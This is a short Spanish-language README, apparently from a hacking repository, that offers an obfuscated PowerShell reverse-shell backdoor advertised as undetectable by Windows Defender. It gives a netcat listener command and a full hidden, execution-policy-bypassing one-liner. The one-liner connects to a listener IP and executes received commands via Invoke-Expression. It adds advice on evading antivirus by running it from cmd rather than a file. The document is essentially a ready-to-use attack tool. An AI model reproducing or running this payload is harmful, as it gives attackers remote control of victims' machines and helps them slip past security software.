# PowShell.ps1
Comando de PowerShell ofuscado para realizar un backdoor, indetectable para windows defender, ideal para realizar PE 

## Primero debes tener el listening listo en kali linux / otra distro

kovax00@Fsociety$: sudo nc -lvp 9001

## Luego colocar este shell en cmd

powershell -nop -W hidden -noni -ep bypass -c "$x0001 = New-Object Net.Sockets.TCPClient('192.168.232.130', 9001);$NetworkStream = $x0001.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$x0001.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'Kovax00@Fsociety$: ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$x0003 = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$x0003 = try {Invoke-Expression $x0003 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($x0003)}$StreamWriter.Close()"

## Si lo llega a detecta el antivirus por razon de "Quemado" aun asi deberia funcionar la conexion por cmd mientras no lo tengas en un archivo.

Happy hunting 
